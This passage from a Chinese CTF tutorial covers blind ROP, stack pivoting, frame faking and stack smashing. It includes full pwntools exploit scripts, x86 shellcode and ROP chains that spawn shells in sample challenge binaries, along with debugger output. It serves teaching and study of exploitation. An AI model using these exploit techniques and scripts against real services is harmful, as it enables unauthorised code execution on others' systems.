这里我们直接尝试 64 位程序没有开启 PIE 的情况，因为一般是这个样子的，，，如果开启了，，那就按照开启了的方法做，，结果发现了不少，，我选择了一个貌似返回到源程序中的地址

```
one success stop gadget addr: 0x4006b6
```

#### 识别 brop gadgets

下面，我们根据上面介绍的原理来得到对应的 brop gadgets 地址。构造如下，get_brop_gadget 是为了得到可能的 brop gadget，后面的 check_brop_gadget 是为了检查。

```
def get_brop_gadget(length, stop_gadget, addr):
    try:
        sh = remote('127.0.0.1', 9999)
        sh.recvuntil('password?\n')
        payload = 'a' * length + p64(addr) + p64(0) * 6 + p64(
            stop_gadget) + p64(0) * 10
        sh.sendline(payload)
        content = sh.recv()
        sh.close()
        print content
        # stop gadget returns memory
        if not content.startswith('WelCome'):
            return False
        return True
    except Exception:
        sh.close()
        return False
def check_brop_gadget(length, addr):
    try:
        sh = remote('127.0.0.1', 9999)
        sh.recvuntil('password?\n')
        payload = 'a' * length + p64(addr) + 'a' * 8 * 10
        sh.sendline(payload)
        content = sh.recv()
        sh.close()
        return False
    except Exception:
        sh.close()
        return True
##length = getbufferflow_length()
length = 72
##get_stop_addr(length)
stop_gadget = 0x4006b6
addr = 0x400740
while 1:
    print hex(addr)
    if get_brop_gadget(length, stop_gadget, addr):
        print 'possible brop gadget: 0x%x' % addr
        if check_brop_gadget(length, addr):
            print 'success brop gadget: 0x%x' % addr
            break
    addr += 1

```

这样，我们基本得到了 brop 的 gadgets 地址 0x4007ba

#### 确定 puts@plt 地址

根据上面，所说我们可以构造如下 payload 来进行获取

```
payload = 'A'*72 +p64(pop_rdi_ret)+p64(0x400000)+p64(addr)+p64(stop_gadget)
```

具体函数如下

```
def get_puts_addr(length, rdi_ret, stop_gadget):
    addr = 0x400000
    while 1:
        print hex(addr)
        sh = remote('127.0.0.1', 9999)
        sh.recvuntil('password?\n')
        payload = 'A' * length + p64(rdi_ret) + p64(0x400000) + p64(
            addr) + p64(stop_gadget)
        sh.sendline(payload)
        try:
            content = sh.recv()
            if content.startswith('\x7fELF'):
                print 'find puts@plt addr: 0x%x' % addr
                return addr
            sh.close()
            addr += 1
        except Exception:
            sh.close()
            addr += 1

```

最后根据 plt 的结构，选择 0x400560 作为 puts@plt

#### 泄露 puts@got 地址

在我们可以调用 puts 函数后，我们可以泄露 puts 函数的地址，进而获取 libc 版本，从而获取相关的 system 函数地址与 / bin/sh 地址，从而获取 shell。我们从 0x400000 开始泄露 0x1000 个字节，这已经足够包含程序的 plt 部分了。代码如下

```
def leak(length, rdi_ret, puts_plt, leak_addr, stop_gadget):
    sh = remote('127.0.0.1', 9999)
    payload = 'a' * length + p64(rdi_ret) + p64(leak_addr) + p64(
        puts_plt) + p64(stop_gadget)
    sh.recvuntil('password?\n')
    sh.sendline(payload)
    try:
        data = sh.recv()
        sh.close()
        try:
            data = data[:data.index("\nWelCome")]
        except Exception:
            data = data
        if data == "":
            data = '\x00'
        return data
    except Exception:
        sh.close()
        return None
##length = getbufferflow_length()
length = 72
##stop_gadget = get_stop_addr(length)
stop_gadget = 0x4006b6
##brop_gadget = find_brop_gadget(length,stop_gadget)
brop_gadget = 0x4007ba
rdi_ret = brop_gadget + 9
##puts_plt = get_puts_plt(length, rdi_ret, stop_gadget)
puts_plt = 0x400560
addr = 0x400000
result = ""
while addr < 0x401000:
    print hex(addr)
    data = leak(length, rdi_ret, puts_plt, addr, stop_gadget)
    if data is None:
        continue
    else:
        result += data
    addr += len(data)
with open('code', 'wb') as f:
    f.write(result)

```

最后，我们将泄露的内容写到文件里。需要注意的是如果泄露出来的是 “”, 那说明我们遇到了’\x00’，因为 puts 是输出字符串，字符串是以’\x00’为终止符的。之后利用 ida 打开 binary 模式，首先在 edit->segments->rebase program 将程序的基地址改为 0x400000，然后找到偏移 0x560 处，如下

```
seg000:0000000000400560                 db 0FFh
seg000:0000000000400561                 db  25h ; %
seg000:0000000000400562                 db 0B2h ;
seg000:0000000000400563                 db  0Ah
seg000:0000000000400564                 db  20h
seg000:0000000000400565                 db    0

```

然后按下 c, 将此处的数据转换为汇编指令，如下

```
seg000:0000000000400560 ; ---------------------------------------------------------------------------
seg000:0000000000400560                 jmp     qword ptr cs:601018h
seg000:0000000000400566 ; ---------------------------------------------------------------------------
seg000:0000000000400566                 push    0
seg000:000000000040056B                 jmp     loc_400550
seg000:000000000040056B ; ---------------------------------------------------------------------------

```

这说明，puts@got 的地址为 0x601018。

#### 程序利用

```
##length = getbufferflow_length()
length = 72
##stop_gadget = get_stop_addr(length)
stop_gadget = 0x4006b6
##brop_gadget = find_brop_gadget(length,stop_gadget)
brop_gadget = 0x4007ba
rdi_ret = brop_gadget + 9
##puts_plt = get_puts_addr(length, rdi_ret, stop_gadget)
puts_plt = 0x400560
##leakfunction(length, rdi_ret, puts_plt, stop_gadget)
puts_got = 0x601018
sh = remote('127.0.0.1', 9999)
sh.recvuntil('password?\n')
payload = 'a' * length + p64(rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(
    stop_gadget)
sh.sendline(payload)
data = sh.recvuntil('\nWelCome', drop=True)
puts_addr = u64(data.ljust(8, '\x00'))
libc = LibcSearcher('puts', puts_addr)
libc_base = puts_addr - libc.dump('puts')
system_addr = libc_base + libc.dump('system')
binsh_addr = libc_base + libc.dump('str_bin_sh')
payload = 'a' * length + p64(rdi_ret) + p64(binsh_addr) + p64(
    system_addr) + p64(stop_gadget)
sh.sendline(payload)
sh.interactive()

```

### 参考阅读

*   [http://ytliu.info/blog/2014/09/28/blind-return-oriented-programming-brop-attack-gong-ji-yuan-li/](http://ytliu.info/blog/2014/09/28/blind-return-oriented-programming-brop-attack-gong-ji-yuan-li/)
*   [http://bobao.360.cn/learning/detail/3694.html](http://bobao.360.cn/learning/detail/3694.html)
*   [http://o0xmuhe.me/2017/01/22/Have-fun-with-Blind-ROP/](http://o0xmuhe.me/2017/01/22/Have-fun-with-Blind-ROP/)

stack pivoting
--------------

### 原理

stack pivoting，正如它所描述的，该技巧就是劫持栈指针指向攻击者所能控制的内存处，然后再在相应的位置进行 ROP。一般来说，我们可能在以下情况需要使用 stack pivoting

*   可以控制的栈溢出的字节数较少，难以构造较长的 ROP 链
*   开启了 PIE 保护，栈地址未知，我们可以将栈劫持到已知的区域。
*   其它漏洞难以利用，我们需要进行转换，比如说将栈劫持到堆空间，从而在堆上写 rop 及进行堆漏洞利用

此外，利用 stack pivoting 有以下几个要求

*   可以控制程序执行流。
    
*   可以控制 sp 指针。一般来说，控制栈指针会使用 ROP，常见的控制栈指针的 gadgets 一般是
    

```
pop rsp/esp
```

当然，还会有一些其它的姿势。比如说 libc_csu_init 中的 gadgets，我们通过偏移就可以得到控制 rsp 指针。上面的是正常的，下面的是偏移的。

```
gef➤  x/7i 0x000000000040061a
0x40061a <__libc_csu_init+90>:    pop    rbx
0x40061b <__libc_csu_init+91>:    pop    rbp
0x40061c <__libc_csu_init+92>:    pop    r12
0x40061e <__libc_csu_init+94>:    pop    r13
0x400620 <__libc_csu_init+96>:    pop    r14
0x400622 <__libc_csu_init+98>:    pop    r15
0x400624 <__libc_csu_init+100>:    ret    
gef➤  x/7i 0x000000000040061d
0x40061d <__libc_csu_init+93>:    pop    rsp
0x40061e <__libc_csu_init+94>:    pop    r13
0x400620 <__libc_csu_init+96>:    pop    r14
0x400622 <__libc_csu_init+98>:    pop    r15
0x400624 <__libc_csu_init+100>:    ret

```

此外，还有更加高级的 fake frame。

*   存在可以控制内容的内存，一般有如下
    *   bss 段。由于进程按页分配内存，分配给 bss 段的内存大小至少一个页 (4k，0x1000) 大小。然而一般 bss 段的内容用不了这么多的空间，并且 bss 段分配的内存页拥有读写权限。
    *   heap。但是这个需要我们能够泄露堆地址。

### 示例

#### 例 1

这里我们以 [X-CTF Quals 2016 - b0verfl0w](https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/stackoverflow/stackprivot/X-CTF%20Quals%202016%20-%20b0verfl0w) 为例进行介绍。首先，查看程序的安全保护，如下

```
➜  X-CTF Quals 2016 - b0verfl0w git:(iromise) ✗ checksec b0verfl0w                 
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x8048000)
    RWX:      Has RWX segments

```

可以看出源程序为 32 位，也没有开启 NX 保护，下面我们来找一下程序的漏洞

```
signed int vul()
{
  char s; // [sp+18h] [bp-20h]@1
  puts("\n======================");
  puts("\nWelcome to X-CTF 2016!");
  puts("\n======================");
  puts("What's your name?");
  fflush(stdout);
  fgets(&s, 50, stdin);
  printf("Hello %s.", &s);
  fflush(stdout);
  return 1;
}

```

可以看出，源程序存在栈溢出漏洞。但是其所能溢出的字节就只有 50-0x20-4=14 个字节，所以我们很难执行一些比较好的 ROP。这里我们就考虑 stack pivoting 。由于程序本身并没有开启堆栈保护，所以我们可以在栈上布置 shellcode 并执行。基本利用思路如下

*   利用栈溢出布置 shellcode
*   控制 eip 指向 shellcode 处

第一步，还是比较容易地，直接读取即可，但是由于程序本身会开启 ASLR 保护，所以我们很难直接知道 shellcode 的地址。但是栈上相对偏移是固定的，所以我们可以利用栈溢出对 esp 进行操作，使其指向 shellcode 处，并且直接控制程序跳转至 esp 处。那下面就是找控制程序跳转到 esp 处的 gadgets 了。

```
➜  X-CTF Quals 2016 - b0verfl0w git:(iromise) ✗ ROPgadget --binary b0verfl0w --only 'jmp|ret'         
Gadgets information
============================================================
0x08048504 : jmp esp
0x0804836a : ret
0x0804847e : ret 0xeac1
Unique gadgets found: 3

```

这里我们发现有一个可以直接跳转到 esp 的 gadgets。那么我们可以布置 payload 如下

```
shellcode|padding|fake ebp|0x08048504|set esp point to shellcode and jmp esp
```

那么我们 payload 中的最后一部分改如何设置 esp 呢，可以知道

*   size(shellcode+padding)=0x20
*   size(fake ebp)=0x4
*   size(0x08048504)=0x4

所以我们最后一段需要执行的指令就是

```
sub esp,0x28
jmp esp

```

所以最后的 exp 如下

```
from pwn import *
sh = process('./b0verfl0w')
shellcode_x86 = "\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73"
shellcode_x86 += "\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0"
shellcode_x86 += "\x0b\xcd\x80"
sub_esp_jmp = asm('sub esp, 0x28;jmp esp')
jmp_esp = 0x08048504
payload = shellcode_x86 + (
    0x20 - len(shellcode_x86)) * 'b' + 'bbbb' + p32(jmp_esp) + sub_esp_jmp
sh.sendline(payload)
sh.interactive()

```

#### 例 2 - 转移堆

待。

### 题目

*   [EkoPartyCTF 2016 fuckzing-exploit-200](https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/stackoverflow/stackprivot/EkoPartyCTF%202016%20fuckzing-exploit-200)

frame faking
------------

正如这个技巧名字所说的那样，这个技巧就是构造一个虚假的栈帧来控制程序的执行流。

### 原理

概括地讲，我们在之前讲的栈溢出不外乎两种方式

*   控制程序 EIP
*   控制程序 EBP

其最终都是控制程序的执行流。在 frame faking 中，我们所利用的技巧便是同时控制 EBP 与 EIP，这样我们在控制程序执行流的同时，也改变程序栈帧的位置。一般来说其 payload 如下

```
buffer padding|fake ebp|leave ret addr|
```

即我们利用栈溢出将栈上构造为如上格式。这里我们主要讲下后面两个部分

*   函数的返回地址被我们覆盖为执行 leave ret 的地址，这就表明了函数在正常执行完自己的 leave ret 后，还会再次执行一次 leave ret。
*   其中 fake ebp 为我们构造的栈帧的基地址，需要注意的是这里是一个地址。一般来说我们构造的假的栈帧如下

```
fake ebp
|
v
ebp2|target function addr|leave ret addr|arg1|arg2

```

这里我们的 fake ebp 指向 ebp2，即它为 ebp2 所在的地址。通常来说，这里都是我们能够控制的可读的内容。

**下面的汇编语法是 intel 语法。**

在我们介绍基本的控制过程之前，我们还是有必要说一下，函数的入口点与出口点的基本操作

入口点

```
push ebp  # 将ebp压栈
mov ebp, esp #将esp的值赋给ebp

```

出口点

```
leave
ret #pop eip，弹出栈顶元素作为程序下一个执行地址

```

其中 leave 指令相当于

```
mov esp, ebp # 将ebp的值赋给esp
pop ebp # 弹出ebp

```

下面我们来仔细说一下基本的控制过程。

1.  在有栈溢出的程序执行 leave 时，其分为两个步骤
    
    *   mov esp, ebp ，这会将 esp 也指向当前栈溢出漏洞的 ebp 基地址处。
    *   pop ebp， 这会将栈中存放的 fake ebp 的值赋给 ebp。即执行完指令之后，ebp 便指向了 ebp2，也就是保存了 ebp2 所在的地址。
2.  执行 ret 指令，会再次执行 leave ret 指令。
    
3.  执行 leave 指令，其分为两个步骤
    
    *   mov esp, ebp ，这会将 esp 指向 ebp2。
    *   pop ebp，此时，会将 ebp 的内容设置为 ebp2 的值，同时 esp 会指向 target function。
4.  执行 ret 指令，这时候程序就会执行 target function，当其进行程序的时候会执行
    
    *   push ebp，会将 ebp2 值压入栈中，
        
    *   mov ebp, esp，将 ebp 指向当前基地址。
        

此时的栈结构如下

```
ebp
|
v
ebp2|leave ret addr|arg1|arg2

```

5.  当程序执行时，其会正常申请空间，同时我们在栈上也安排了该函数对应的参数，所以程序会正常执行。
    
6.  程序结束后，其又会执行两次 leave ret addr，所以如果我们在 ebp2 处布置好了对应的内容，那么我们就可以一直控制程序的执行流程。
    

可以看出在 fake frame 中，我们有一个需求就是，我们必须得有一块可以写的内存，并且我们还知道这块内存的地址，这一点与 stack pivoting 相似。

### 2018 安恒杯 over

以 2018 年 6 月安恒杯月赛的 over 一题为例进行介绍, 题目可以在 [ctf-challenge](https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/stackoverflow/fake_frame/over) 中找到

#### 文件信息

```
over.over: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=99beb778a74c68e4ce1477b559391e860dd0e946, stripped
[*] '/home/m4x/pwn_repo/others_over/over.over'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE

```

64 位动态链接的程序, 没有开 PIE 和 canary 保护, 但开了  
NX 保护

#### 分析程序

放到 IDA 中进行分析

```
__int64 __fastcall main(__int64 a1, char **a2, char **a3)
{
  setvbuf(stdin, 0LL, 2, 0LL);
  setvbuf(stdout, 0LL, 2, 0LL);
  while ( sub_400676() )
    ;
  return 0LL;
}
int sub_400676()
{
  char buf[80]; // [rsp+0h] [rbp-50h]
  memset(buf, 0, sizeof(buf));
  putchar('>');
  read(0, buf, 96uLL);
  return puts(buf);
}

```

漏洞很明显, read 能读入 96 位, 但 buf 的长度只有 80, 因此能覆盖 rbp 以及 ret addr 但也只能覆盖到 rbp 和 ret addr, 因此也只能通过同时控制 rbp 以及 ret addr 来进行 rop 了

#### leak stack

为了控制 rbp, 我们需要知道某些地址, 可以发现当输入的长度为 80 时, 由于 read 并不会给输入末尾补上 ‘\0’, rbp 的值就会被 puts 打印出来, 这样我们就可以通过固定偏移知道栈上所有位置的地址了

```
Breakpoint 1, 0x00000000004006b9 in ?? ()
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
───────────────────────────────────────────────────────[ REGISTERS ]────────────────────────────────────────────────────────
 RAX  0x7ffceaf11160 ◂— 0x3030303030303030 ('00000000')
 RBX  0x0
 RCX  0x7ff756e9b690 (__read_nocancel+7) ◂— cmp    rax, -0xfff
 RDX  0x60
 RDI  0x7ffceaf11160 ◂— 0x3030303030303030 ('00000000')
 RSI  0x7ffceaf11160 ◂— 0x3030303030303030 ('00000000')
 R8   0x7ff75715b760 (_IO_stdfile_1_lock) ◂— 0x0
 R9   0x7ff757354700 ◂— 0x7ff757354700
 R10  0x37b
 R11  0x246
 R12  0x400580 ◂— xor    ebp, ebp
 R13  0x7ffceaf112b0 ◂— 0x1
 R14  0x0
 R15  0x0
 RBP  0x7ffceaf111b0 —▸ 0x7ffceaf111d0 —▸ 0x400730 ◂— push   r15
 RSP  0x7ffceaf11160 ◂— 0x3030303030303030 ('00000000')
 RIP  0x4006b9 ◂— call   0x400530
─────────────────────────────────────────────────────────[ DISASM ]─────────────────────────────────────────────────────────
 ► 0x4006b9    call   puts@plt <0x400530>
        s: 0x7ffceaf11160 ◂— 0x3030303030303030 ('00000000')
   0x4006be    leave
   0x4006bf    ret
   0x4006c0    push   rbp
   0x4006c1    mov    rbp, rsp
   0x4006c4    sub    rsp, 0x10
   0x4006c8    mov    dword ptr [rbp - 4], edi
   0x4006cb    mov    qword ptr [rbp - 0x10], rsi
   0x4006cf    mov    rax, qword ptr [rip + 0x20098a] <0x601060>
   0x4006d6    mov    ecx, 0
   0x4006db    mov    edx, 2
─────────────────────────────────────────────────────────[ STACK ]──────────────────────────────────────────────────────────
00:0000│ rax rdi rsi rsp  0x7ffceaf11160 ◂— 0x3030303030303030 ('00000000')
... ↓
───────────────────────────────────────────────────────[ BACKTRACE ]────────────────────────────────────────────────────────
 ► f 0           4006b9
   f 1           400715
   f 2     7ff756de02b1 __libc_start_main+241
Breakpoint *0x4006B9
pwndbg> stack 15
00:0000│ rax rdi rsi rsp  0x7ffceaf11160 ◂— 0x3030303030303030 ('00000000')
... ↓
0a:0050│ rbp              0x7ffceaf111b0 —▸ 0x7ffceaf111d0 —▸ 0x400730 ◂— push   r15
0b:0058│                  0x7ffceaf111b8 —▸ 0x400715 ◂— test   eax, eax
0c:0060│                  0x7ffceaf111c0 —▸ 0x7ffceaf112b8 —▸ 0x7ffceaf133db ◂— './over.over'
0d:0068│                  0x7ffceaf111c8 ◂— 0x100000000
0e:0070│                  0x7ffceaf111d0 —▸ 0x400730 ◂— push   r15
pwndbg> distance 0x7ffceaf111d0 0x7ffceaf11160
0x7ffceaf111d0->0x7ffceaf11160 is -0x70 bytes (-0xe words)

```

leak 出栈地址后, 我们就可以通过控制 rbp 为栈上的地址 (如 0x7ffceaf11160), ret addr 为 leave ret 的地址来实现控制程序流程了。

比如我们可以在 0x7ffceaf11160 + 0x8 填上 leak libc 的 rop chain 并控制其返回到 `sub_400676` 函数来 leak libc。  
​  
然后在下一次利用时就可以通过 rop 执行 `system("/bin/sh")` 或 `execve("/bin/sh", 0, 0)` 来 get shell 了, 这道题目因为输入的长度足够, 我们可以布置调用 `execve("/bin/sh", 0, 0)` 的利用链, 这种方法更稳妥 (`system("/bin/sh")` 可能会因为 env 被破坏而失效), 不过由于利用过程中栈的结构会发生变化, 所以一些关键的偏移还需要通过调试来确定

#### exp

```
from pwn import *
context.binary = "./over.over"
def DEBUG(cmd):
    raw_input("DEBUG: ")
    gdb.attach(io, cmd)
io = process("./over.over")
elf = ELF("./over.over")
libc = elf.libc
io.sendafter(">", 'a' * 80)
stack = u64(io.recvuntil("\x7f")[-6: ].ljust(8, '\0')) - 0x70
success("stack -> {:#x}".format(stack))
#  DEBUG("b *0x4006B9\nc")
io.sendafter(">", flat(['11111111', 0x400793, elf.got['puts'], elf.plt['puts'], 0x400676, (80 - 40) * '1', stack, 0x4006be]))
libc.address = u64(io.recvuntil("\x7f")[-6: ].ljust(8, '\0')) - libc.sym['puts']
success("libc.address -> {:#x}".format(libc.address))
pop_rdi_ret=0x400793
'''
$ ROPgadget --binary /lib/x86_64-linux-gnu/libc.so.6 --only "pop|ret"
0x00000000000f5279 : pop rdx ; pop rsi ; ret
'''
pop_rdx_pop_rsi_ret=libc.address+0xf5279
payload=flat(['22222222', pop_rdi_ret, next(libc.search("/bin/sh")),pop_rdx_pop_rsi_ret,p64(0),p64(0), libc.sym['execve'], (80 - 7*8 ) * '2', stack - 0x30, 0x4006be])
io.sendafter(">", payload)
io.interactive()

```

总的来说这种方法跟 stack pivot 差别并不是很大。

### 参考阅读

*   [http://www.xfocus.net/articles/200602/851.html](http://www.xfocus.net/articles/200602/851.html)
*   [http://phrack.org/issues/58/4.html](http://phrack.org/issues/58/4.html)

Stack smash
-----------

### 原理

在程序加了 canary 保护之后，如果我们读取的 buffer 覆盖了对应的值时，程序就会报错，而一般来说我们并不会关心报错信息。而 stack smash 技巧则就是利用打印这一信息的程序来得到我们想要的内容。这是因为在程序启动 canary 保护之后，如果发现 canary 被修改的话，程序就会执行 `__stack_chk_fail` 函数来打印 argv[0] 指针所指向的字符串，正常情况下，这个指针指向了程序名。其代码如下

```
void __attribute__ ((noreturn)) __stack_chk_fail (void)
{
  __fortify_fail ("stack smashing detected");
}
void __attribute__ ((noreturn)) internal_function __fortify_fail (const char *msg)
{
  /* The loop is added only to keep gcc happy.  */
  while (1)
    __libc_message (2, "*** %s ***: %s terminated\n",
                    msg, __libc_argv[0] ?: "<unknown>");
}

```

所以说如果我们利用栈溢出覆盖 argv[0] 为我们想要输出的字符串的地址，那么在 `__fortify_fail` 函数中就会输出我们想要的信息。

### 32C3 CTF readme

这里，我们以 2015 年 32C3 CTF readme 为例进行介绍，该题目在 jarvisoj 上有复现。

#### 确定保护

可以看出程序为 64 位，主要开启了 Canary 保护以及 NX 保护，以及 FORTIFY 保护。

```
➜  stacksmashes git:(master) ✗ checksec smashes
    Arch:     amd64-64-little
    RELRO:    No RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
    FORTIFY:  Enabled

```

#### 分析程序

ida 看一下

```
__int64 sub_4007E0()
{
  __int64 v0; // rax@1
  __int64 v1; // rbx@2
  int v2; // eax@3
  __int64 v4; // [sp+0h] [bp-128h]@1
  __int64 v5; // [sp+108h] [bp-20h]@1
  v5 = *MK_FP(__FS__, 40LL);
  __printf_chk(1LL, (__int64)"Hello!\nWhat's your name? ");
  LODWORD(v0) = _IO_gets((__int64)&v4);
  if ( !v0 )
LABEL_9:
    _exit(1);
  v1 = 0LL;
  __printf_chk(1LL, (__int64)"Nice to meet you, %s.\nPlease overwrite the flag: ");
  while ( 1 )
  {
    v2 = _IO_getc(stdin);
    if ( v2 == -1 )
      goto LABEL_9;
    if ( v2 == '\n' )
      break;
    byte_600D20[v1++] = v2;
    if ( v1 == ' ' )
      goto LABEL_8;
  }
  memset((void *)((signed int)v1 + 0x600D20LL), 0, (unsigned int)(32 - v1));
LABEL_8:
  puts("Thank you, bye!");
  return *MK_FP(__FS__, 40LL) ^ v5;
}

```

很显然，程序在 `_IO_gets((__int64)&v4)`; 存在栈溢出。

此外，程序中还提示要 overwrite flag。而且发现程序很有意思的在 while 循环之后执行了这条语句

```
  memset((void *)((signed int)v1 + 0x600D20LL), 0, (unsigned int)(32 - v1));
```

又看了看对应地址的内容，可以发现如下内容，说明程序的 flag 就在这里。

```
.data:0000000000600D20 ; char aPctfHereSTheFl[]
.data:0000000000600D20 aPctfHereSTheFl db 'PCTF{Here',27h,'s the flag on server}',0

```

但是如果我们直接利用栈溢出输出该地址的内容是不可行的，这是因为我们读入的内容 `byte_600D20[v1++] = v2;`也恰恰就是该块内存，这会直接将其覆盖掉，这时候我们就需要利用一个技巧了

*   在 ELF 内存映射时，bss 段会被映射两次，所以我们可以使用另一处的地址来进行输出，可以使用 gdb 的 find 来进行查找。

#### 确定 flag 地址

我们把断点下载 memset 函数处，然后读取相应的内容如下

```
gef➤  c
Continuing.
Hello!
What's your name? qqqqqqq
Nice to meet you, qqqqqqq.
Please overwrite the flag: 222222222
Breakpoint 1, __memset_avx2 () at ../sysdeps/x86_64/multiarch/memset-avx2.S:38
38    ../sysdeps/x86_64/multiarch/memset-avx2.S: 没有那个文件或目录.
─────────────────────────────────────[ code:i386:x86-64 ]────
   0x7ffff7b7f920 <__memset_chk_avx2+0> cmp    rcx, rdx
   0x7ffff7b7f923 <__memset_chk_avx2+3> jb     0x7ffff7b24110 <__GI___chk_fail>
   0x7ffff7b7f929                  nop    DWORD PTR [rax+0x0]
 → 0x7ffff7b7f930 <__memset_avx2+0> vpxor  xmm0, xmm0, xmm0
   0x7ffff7b7f934 <__memset_avx2+4> vmovd  xmm1, esi
   0x7ffff7b7f938 <__memset_avx2+8> lea    rsi, [rdi+rdx*1]
   0x7ffff7b7f93c <__memset_avx2+12> mov    rax, rdi
───────────────────────────────────────────────────────────────────[ stack ]────
['0x7fffffffda38', 'l8']
8
0x00007fffffffda38│+0x00: 0x0000000000400878  →   mov edi, 0x40094e     ← $rsp
0x00007fffffffda40│+0x08: 0x0071717171717171 ("qqqqqqq"?)
0x00007fffffffda48│+0x10: 0x0000000000000000
0x00007fffffffda50│+0x18: 0x0000000000000000
0x00007fffffffda58│+0x20: 0x0000000000000000
0x00007fffffffda60│+0x28: 0x0000000000000000
0x00007fffffffda68│+0x30: 0x0000000000000000
0x00007fffffffda70│+0x38: 0x0000000000000000
──────────────────────────────────────────────────────────────────────────────[ trace ]────
[#0] 0x7ffff7b7f930 → Name: __memset_avx2()
[#1] 0x400878 → mov edi, 0x40094e
──────────────────────────────────────────────────────────────────────────────
gef➤  find 22222
Argument required (expression to compute).
gef➤  find '22222'
No symbol "22222" in current context.
gef➤  grep '22222'
[+] Searching '22222' in memory
[+] In '/mnt/hgfs/Hack/ctf/ctf-wiki/pwn/stackoverflow/example/stacksmashes/smashes'(0x600000-0x601000), permission=rw-
  0x600d20 - 0x600d3f  →   "222222222's the flag on server}" 
[+] In '[heap]'(0x601000-0x622000), permission=rw-
  0x601010 - 0x601019  →   "222222222" 
gef➤  grep PCTF
[+] Searching 'PCTF' in memory
[+] In '/mnt/hgfs/Hack/ctf/ctf-wiki/pwn/stackoverflow/example/stacksmashes/smashes'(0x400000-0x401000), permission=r-x
  0x400d20 - 0x400d3f  →   "PCTF{Here's the flag on server}" 

```

可以看出我们读入的 2222 已经覆盖了 0x600d20 处的 flag，但是我们在内存的 0x400d20 处仍然找到了这个 flag 的备份，所以我们还是可以将其输出。这里我们已经确定了 flag 的地址。

#### 确定偏移

下面，我们确定 argv[0] 距离读取的字符串的偏移。

首先下断点在 main 函数入口处，如下

```
gef➤  b *0x00000000004006D0
Breakpoint 1 at 0x4006d0
gef➤  r
Starting program: /mnt/hgfs/Hack/ctf/ctf-wiki/pwn/stackoverflow/example/stacksmashes/smashes 
Breakpoint 1, 0x00000000004006d0 in ?? ()
 code:i386:x86-64 ]────
     0x4006c0 <_IO_gets@plt+0> jmp    QWORD PTR [rip+0x20062a]        # 0x600cf0 <_IO_gets@got.plt>
     0x4006c6 <_IO_gets@plt+6> push   0x9
     0x4006cb <_IO_gets@plt+11> jmp    0x400620
 →   0x4006d0                  sub    rsp, 0x8
     0x4006d4                  mov    rdi, QWORD PTR [rip+0x200665]        # 0x600d40 <stdout>
     0x4006db                  xor    esi, esi
     0x4006dd                  call   0x400660 <setbuf@plt>
──────────────────────────────────────────────────────────────────[ stack ]────
['0x7fffffffdb78', 'l8']
8
0x00007fffffffdb78│+0x00: 0x00007ffff7a2d830  →  <__libc_start_main+240> mov edi, eax     ← $rsp
0x00007fffffffdb80│+0x08: 0x0000000000000000
0x00007fffffffdb88│+0x10: 0x00007fffffffdc58  →  0x00007fffffffe00b  →  "/mnt/hgfs/Hack/ctf/ctf-wiki/pwn/stackoverflow/exam[...]"
0x00007fffffffdb90│+0x18: 0x0000000100000000
0x00007fffffffdb98│+0x20: 0x00000000004006d0  →   sub rsp, 0x8
0x00007fffffffdba0│+0x28: 0x0000000000000000
0x00007fffffffdba8│+0x30: 0x48c916d3cf726fe3
0x00007fffffffdbb0│+0x38: 0x00000000004006ee  →   xor ebp, ebp
──────────────────────────────────────────────────────────────[ trace ]────
[#0] 0x4006d0 → sub rsp, 0x8
[#1] 0x7ffff7a2d830 → Name: __libc_start_main(main=0x4006d0, argc=0x1, argv=0x7fffffffdc58, init=<optimized out>, fini=<optimized out>, rtld_fini=<optimized out>, stack_end=0x7fffffffdc48)
---Type <return> to continue, or q <return> to quit---
[#2] 0x400717 → hlt 

```

可以看出 0x00007fffffffe00b 指向程序名，其自然就是 argv[0]，所以我们修改的内容就是这个地址。同时 0x00007fffffffdc58 处保留着该地址，所以我们真正需要的地址是 0x00007fffffffdc58。

此外，根据汇编代码

```
.text:00000000004007E0                 push    rbp
.text:00000000004007E1                 mov     esi, offset aHelloWhatSYour ; "Hello!\nWhat's your name? "
.text:00000000004007E6                 mov     edi, 1
.text:00000000004007EB                 push    rbx
.text:00000000004007EC                 sub     rsp, 118h
.text:00000000004007F3                 mov     rax, fs:28h
.text:00000000004007FC                 mov     [rsp+128h+var_20], rax
.text:0000000000400804                 xor     eax, eax
.text:0000000000400806                 call    ___printf_chk
.text:000000000040080B                 mov     rdi, rsp
.text:000000000040080E                 call    __IO_gets

```

我们可以确定我们读入的字符串的起始地址其实就是调用 `__IO_gets` 之前的 rsp，所以我们把断点下在 call 处，如下

```
gef➤  b *0x000000000040080E
Breakpoint 2 at 0x40080e
gef➤  c
Continuing.
Hello!
What's your name? 
Breakpoint 2, 0x000000000040080e in ?? ()
──────────────────────────[ code:i386:x86-64 ]────
     0x400804                  xor    eax, eax
     0x400806                  call   0x4006b0 <__printf_chk@plt>
     0x40080b                  mov    rdi, rsp
 →   0x40080e                  call   0x4006c0 <_IO_gets@plt>
   ↳    0x4006c0 <_IO_gets@plt+0> jmp    QWORD PTR [rip+0x20062a]        # 0x600cf0 <_IO_gets@got.plt>
        0x4006c6 <_IO_gets@plt+6> push   0x9
        0x4006cb <_IO_gets@plt+11> jmp    0x400620
        0x4006d0                  sub    rsp, 0x8
──────────────────[ stack ]────
['0x7fffffffda40', 'l8']
8
0x00007fffffffda40│+0x00: 0x0000ff0000000000     ← $rsp, $rdi
0x00007fffffffda48│+0x08: 0x0000000000000000
0x00007fffffffda50│+0x10: 0x0000000000000000
0x00007fffffffda58│+0x18: 0x0000000000000000
0x00007fffffffda60│+0x20: 0x0000000000000000
0x00007fffffffda68│+0x28: 0x0000000000000000
0x00007fffffffda70│+0x30: 0x0000000000000000
0x00007fffffffda78│+0x38: 0x0000000000000000
────────────────────────────────────────────[ trace ]────
